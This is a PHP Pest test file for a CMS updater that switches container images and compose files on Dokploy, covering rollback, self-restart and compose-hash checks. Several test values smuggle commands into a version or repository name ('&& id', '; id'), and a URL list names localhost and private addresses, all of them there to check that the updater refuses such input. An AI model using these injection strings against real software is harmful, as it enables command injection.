    ($this->pushSteps)(['deploy' => 'done', 'web' => 'done', 'worker' => 'done', 'worker-long' => 'done', 'scheduler' => 'done', 'check' => 'done', 'updater' => 'failed']);
    $this->platform->calls = [];

    ($this->tick)();

    expect(($this->row)()->status)->toBe('done')->and($this->platform->calls)->toBe([]);
});

it('refuses a later request while the updater is stale', function (): void {
    Http::swap(new Factory);
    updSite('0.1.0-rc.15', ['0.1.0-rc.16', '0.1.0-rc.15', '0.1.0-rc.14']);
    ($this->fakeHttp)(['0.1.0-rc.16', '0.1.0-rc.15', '0.1.0-rc.14']);
    updOperator();
    config(['teme.version' => '0.1.0-rc.15']);
    ($this->request)(UpdateKind::Update, '0.1.0-rc.16');
    config(['teme.version' => '0.1.0-rc.14']);   // the updater never restarted; the site, on rc.15's image, did
    $this->platform = new FakePlatform($this->new);
    app()->instance(Platform::class, $this->platform);

    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('The updater runs Teme 0.1.0-rc.14, but the site runs 0.1.0-rc.15. Set TEME_UPDATER_IMAGE to Teme 0.1.0-rc.15’s image on the platform and deploy, then request the update again.')
        ->and($this->platform->calls)->toBe([]);
});

it('asks the updater to restart once, and only once, when the platform lists nothing', function (): void {
    ($this->request)();
    ($this->tick)();
    $startedAt = now()->subSeconds(31);
    ($this->pushSteps)(['deploy' => 'done', 'web' => 'done', 'worker' => 'done', 'worker-long' => 'done', 'scheduler' => 'done', 'check' => 'done', 'updater' => 'started'], $startedAt);
    $this->platform->calls = [];
    $this->platform->deployments = [];
    $this->platform->outcome = null;

    ($this->ticks)(5);

    expect($this->platform->calls)->toBe(["setImage TEME_UPDATER_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15, the updater'])
        ->and(($this->row)()->status)->toBe('done');
});

it('ends the update done before the updater replaces itself, leaving nothing open', function (): void {
    ($this->request)();
    ($this->until)('check');
    ($this->ticks)(8);

    $calls = count($this->platform->calls);

    expect(($this->row)()->status)->toBe('done')
        ->and(app(TemeUpdates::class)->open())->toBeNull()
        ->and(($this->states)()['check'])->toBe('done')
        ->and(($this->states)()['updater'])->toBe('done')
        ->and(end($this->platform->calls))->toBe('deploy Teme 0.1.0-rc.15, the updater');

    ($this->ticks)(3);

    expect($this->platform->calls)->toHaveCount($calls);
});

it('treats the updater step as done whenever the updater already runs the new release', function (string $state): void {
    ($this->request)();
    ($this->tick)();
    ($this->pushSteps)(['deploy' => 'done', 'web' => 'done', 'worker' => 'done', 'worker-long' => 'done', 'scheduler' => 'done', 'check' => 'done', 'updater' => $state]);
    $before = $this->platform->calls;
    config(['teme.version' => '0.1.0-rc.15']);

    ($this->tick)();

    expect(($this->row)()->status)->toBe('done')->and($this->platform->calls)->toBe($before);
})->with(['pending', 'started']);

it('does nothing for a cancelled request, or when none is open', function (): void {
    ($this->tick)();
    $id = ($this->request)();
    DB::table('teme_updates')->where('id', $id)->update(['status' => 'cancelled', 'finished_at' => now()]);
    Http::assertNothingSent();

    ($this->tick)();

    expect(($this->row)()->status)->toBe('cancelled')->and($this->platform->calls)->toBe([]);
    Http::assertNothingSent();
});

it('rolls back as it updates: the previous image on the service, the same way', function (): void {
    Http::swap(new Factory);
    updSite('0.1.0-rc.15', ['0.1.0-rc.15', '0.1.0-rc.14']);
    updDeployed('0.1.0-rc.14', 600);
    ($this->fakeHttp)(['0.1.0-rc.15', '0.1.0-rc.14']);
    updOperator();
    $this->platform = new FakePlatform($this->new);
    app()->instance(Platform::class, $this->platform);
    ($this->request)(UpdateKind::Rollback, '0.1.0-rc.14');
    $this->site = '0.1.0-rc.14';

    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.14');
    ($this->ticks)(20);

    expect(($this->row)()->status)->toBe('done')
        ->and($this->platform->images)->each->toBe($this->old)
        ->and($this->platform->calls[0])->toBe("setImage TEME_IMAGE {$this->old}")
        ->and($this->platform->calls[1])->toBe('deploy Teme 0.1.0-rc.14')
        ->and(end($this->platform->calls))->toBe('deploy Teme 0.1.0-rc.14, the updater');
});

it('builds the image name only from Teme’s repository and a release’s version', function (): void {
    expect(ImageName::for('0.1.0-rc.15'))->toBe('ghcr.io/temecms/teme:0.1.0-rc.15')
        ->and(ImageName::for('1.20.3'))->toBe('ghcr.io/temecms/teme:1.20.3');
});

it('refuses anything else before any call', function (string $version, string $repository, string $sentence): void {
    config(['teme.updater.image_repository' => $repository]);

    expect(fn () => ImageName::for($version))->toThrow(PlatformRefused::class, $sentence);
})->with([
    'latest' => ['latest', UR_IMAGE, 'latest isn’t a release’s version.'],
    'a command after the version' => ['0.1.0-rc.15 && id', UR_IMAGE, '0.1.0-rc.15 && id isn’t a release’s version.'],
    'a path' => ['../0.1.0', UR_IMAGE, '../0.1.0 isn’t a release’s version.'],
    'upper case' => ['0.1.0-RC.15', UR_IMAGE, '0.1.0-RC.15 isn’t a release’s version.'],
    'a command in the repository' => ['0.1.0-rc.15', 'ghcr.io/x/teme; id', 'TEME_IMAGE_REPOSITORY must be Teme’s image on ghcr.io, such as ghcr.io/example/teme.'],
    'another registry' => ['0.1.0-rc.15', 'docker.io/library/teme', 'TEME_IMAGE_REPOSITORY must be Teme’s image on ghcr.io, such as ghcr.io/example/teme.'],
    'an upper case owner' => ['0.1.0-rc.15', 'ghcr.io/Owner/teme', 'TEME_IMAGE_REPOSITORY must be Teme’s image on ghcr.io, such as ghcr.io/example/teme.'],
    'no repository' => ['0.1.0-rc.15', '', 'TEME_IMAGE_REPOSITORY must be Teme’s image on ghcr.io, such as ghcr.io/example/teme.'],
]);

it('refuses a version with a trailing newline, which a pattern without D lets through', function (): void {
    $version = "0.1.0-rc.15\n";

    expect(TemeVersion::isRelease($version))->toBeTrue()
        ->and(fn () => ImageName::for($version))->toThrow(PlatformRefused::class)
        ->and(fn () => ImageName::for("0.1.0-rc.15\n"))->toThrow(PlatformRefused::class);

    config(['teme.updater.image_repository' => "ghcr.io/x/teme\n"]);

    expect(fn () => ImageName::for('0.1.0-rc.15'))->toThrow(PlatformRefused::class);
});

it('holds its version pattern to the one TemeVersion keeps, apart from the modifier', function (): void {
    expect(substr(ImageName::VERSION, 0, -1))->toBe(TemeVersion::PATTERN)
        ->and(substr(ImageName::VERSION, -1))->toBe('D');
});

/*
 * The compose file: the template repository lists, in compose-hashes.json, the
 * hash of its current Dokploy compose file and of every one it has released.
 * The updater replaces the service's file only when it is one of those, in the
 * same deploy as the image, and only with the current one.
 */

const UR_OLD_COMPOSE = "services:\n  web:\n    image: \${TEME_IMAGE:?set it}\n";
const UR_NEW_COMPOSE = "services:\n  web:\n    image: \${TEME_IMAGE:?set it}\n    init: true\n";
const UR_EDITED_COMPOSE = "services:\n  web:\n    image: \${TEME_IMAGE:?set it}\n    ports: ['80:8080']\n";

/** The template's list: UR_NEW_COMPOSE current, UR_OLD_COMPOSE released before it; and the file the template serves. */
function urTemplate(object $test, string $served = UR_NEW_COMPOSE): void
{
    $test->hashes = fn () => Http::response(['format' => 1, 'current' => ComposeHash::of(UR_NEW_COMPOSE), 'released' => [ComposeHash::of(UR_OLD_COMPOSE), ComposeHash::of(UR_NEW_COMPOSE)]]);
    $test->served = $served;
}

it('replaces a compose file the template released with its current one, in the one deploy that moves the image', function (): void {
    $this->platform->compose = UR_OLD_COMPOSE;
    urTemplate($this);
    ($this->request)();
    $this->site = '0.1.0-rc.15';
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');
    ($this->ticks)(20);

    expect(($this->row)()->status)->toBe('done')
        ->and($this->platform->compose)->toBe(UR_NEW_COMPOSE)
        ->and(array_slice($this->platform->calls, 0, 3))->toBe([
            "setImage TEME_IMAGE {$this->new}", 'setCompose '.substr(ComposeHash::of(UR_NEW_COMPOSE), 0, 12), 'deploy Teme 0.1.0-rc.15',
        ]);
    Http::assertSent(fn ($request): bool => $request->url() === UR_TEMPLATE);
});

it('refuses a compose file edited on the server, says what to do, and changes nothing', function (): void {
    $this->platform->compose = UR_EDITED_COMPOSE;
    urTemplate($this);
    ($this->request)();
    ($this->ticks)(3);

    $row = ($this->row)();

    expect($row->status)->toBe('failed')
        ->and($row->error)->toBe('This site’s compose file was edited on the server, so it can’t be updated automatically. Paste the new template from '.UR_TEMPLATE.', then update.')
        ->and($this->platform->calls)->toBe([])
        ->and($this->platform->compose)->toBe(UR_EDITED_COMPOSE)
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old);
});

it('refuses, and changes nothing, when the list of released compose files can’t be read', function (callable $answer): void {
    $this->platform->compose = UR_OLD_COMPOSE;
    $this->hashes = $answer;
    ($this->request)();
    ($this->ticks)(3);

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('Teme couldn’t read the list of released compose files at '.UR_HASHES.', so nothing was changed.')
        ->and($this->platform->calls)->toBe([])
        ->and($this->platform->compose)->toBe(UR_OLD_COMPOSE);
})->with([
    'not there' => [fn () => Http::response('', 404)],
    'not JSON' => [fn () => Http::response('not json', 200)],
    'no current file' => [fn () => Http::response(['format' => 1, 'released' => []])],
    'a hash that isn’t one' => [fn () => Http::response(['format' => 1, 'current' => 'abc', 'released' => ['abc']])],
]);

it('refuses a file the template serves that isn’t its current one, and changes nothing', function (): void {
    $this->platform->compose = UR_OLD_COMPOSE;
    urTemplate($this, UR_EDITED_COMPOSE);
    ($this->request)();
    ($this->ticks)(3);

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('The template served a compose file at '.UR_TEMPLATE.' that its list doesn’t name as current, so nothing was changed.')
        ->and($this->platform->calls)->toBe([])
        ->and($this->platform->compose)->toBe(UR_OLD_COMPOSE);
});

it('changes only the image when the compose file is the current one already, and fetches no file', function (): void {
    $this->platform->compose = UR_NEW_COMPOSE;
    urTemplate($this);
    ($this->request)();
    ($this->tick)();

    expect(array_slice($this->platform->calls, 0, 2))->toBe(["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15']);
    Http::assertNotSent(fn ($request): bool => $request->url() === UR_TEMPLATE);
});

it('leaves a compose file Dokploy reads from Git to Dokploy’s Pull, changes only the image, and reads no list', function (): void {
    $this->platform->compose = UR_EDITED_COMPOSE;
    $this->platform->composeFromGit = true;
    urTemplate($this);
    ($this->request)();
    ($this->tick)();

    expect(array_slice($this->platform->calls, 0, 2))->toBe(["setImage TEME_IMAGE {$this->new}", 'deploy Teme 0.1.0-rc.15'])
        ->and($this->platform->compose)->toBe(UR_EDITED_COMPOSE);
    Http::assertNotSent(fn ($request): bool => in_array($request->url(), [UR_HASHES, UR_TEMPLATE], true));
});

it('reads the list only from a public https address, and asks it nothing otherwise', function (string $address): void {
    config(['teme.updater.dokploy.compose_hashes_url' => $address]);
    $this->platform->compose = UR_OLD_COMPOSE;
    ($this->request)();
    ($this->ticks)(3);

    expect(($this->row)()->error)->toBe('TEME_DOKPLOY_COMPOSE_HASHES_URL must be an https:// address of a compose-hashes.json on a public name, so nothing was changed.')
        ->and($this->platform->calls)->toBe([]);
    Http::assertNotSent(fn ($request): bool => str_contains($request->url(), 'compose-hashes.json'));
})->with([
    'http' => ['http://templates.example.org/compose-hashes.json'],
    'an IPv4 address' => ['https://203.0.113.9/compose-hashes.json'],
    'a private IPv4 address' => ['https://10.0.0.5/compose-hashes.json'],
    'an IPv6 address' => ['https://[::1]/compose-hashes.json'],
    'localhost' => ['https://localhost/compose-hashes.json'],
    'a name without a dot' => ['https://dokploy/compose-hashes.json'],
    'a .local name' => ['https://templates.local/compose-hashes.json'],
    'a .internal name' => ['https://templates.internal/compose-hashes.json'],
    'a name with a user' => ['https://user@templates.example.org/compose-hashes.json'],
    'another file' => ['https://templates.example.org/list.json'],
]);

it('switches back to the old image and the old compose file in one deploy', function (): void {
    $this->platform->compose = UR_OLD_COMPOSE;
    urTemplate($this);
    ($this->request)();
    ($this->tick)();
    ($this->deployRecorded)('0.1.0-rc.15');
    $this->site = '0.1.0-rc.14';
    ($this->ticks)(2);
    $this->travel(16)->minutes();
    ($this->ticks)(8);

    expect(($this->row)()->status)->toBe('switched_back')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old)
        ->and($this->platform->compose)->toBe(UR_OLD_COMPOSE)
        ->and(array_slice($this->platform->calls, -3))->toBe([
            "setImage TEME_IMAGE {$this->old}", 'setCompose '.substr(ComposeHash::of(UR_OLD_COMPOSE), 0, 12), 'deploy Teme 0.1.0-rc.14, switched back',
        ]);
});

it('puts the image and the compose file back when Dokploy refuses the new compose file, and deploys nothing', function (): void {
    $this->platform->compose = UR_OLD_COMPOSE;
    $this->platform->refuseCompose = new PlatformRefused('Dokploy refused the compose file.');
    urTemplate($this);
    ($this->request)();
    ($this->tick)();

    expect(($this->row)()->status)->toBe('failed')
        ->and(($this->row)()->error)->toBe('Dokploy refused the compose file.')
        ->and($this->platform->images['TEME_IMAGE'])->toBe($this->old)
        ->and($this->platform->compose)->toBe(UR_OLD_COMPOSE)
        ->and(($this->deployCalls)())->toBe([]);
});

it('hashes a compose file as the template repository does, whatever its line endings', function (): void {
    expect(ComposeHash::of("a: 1\r\nb: 2\r\n\r\n"))->toBe(ComposeHash::of("a: 1\nb: 2\n"))
        ->and(ComposeHash::of("a: 1\nb: 2"))->toBe(hash('sha256', "a: 1\nb: 2\n"))
        ->and(ComposeHash::of("a: 1\n"))->not->toBe(ComposeHash::of("a: 2\n"))
        ->and(ComposeHash::of("a: 1 \t\x00\x0B\n"))->toBe(ComposeHash::of('a: 1'));
});

it('gives the test vector the template repository’s README and tests name', function (): void {
    // temecms/temecms-for-dokploy, README: "How a compose file is hashed".
    expect(ComposeHash::of("services:\r\n  web: {}\r\n\r\n"))->toBe('78ae680a3841176cc921326a7837fc012f1f21701a4f5a4d6943f9e6c20b8af8');
});
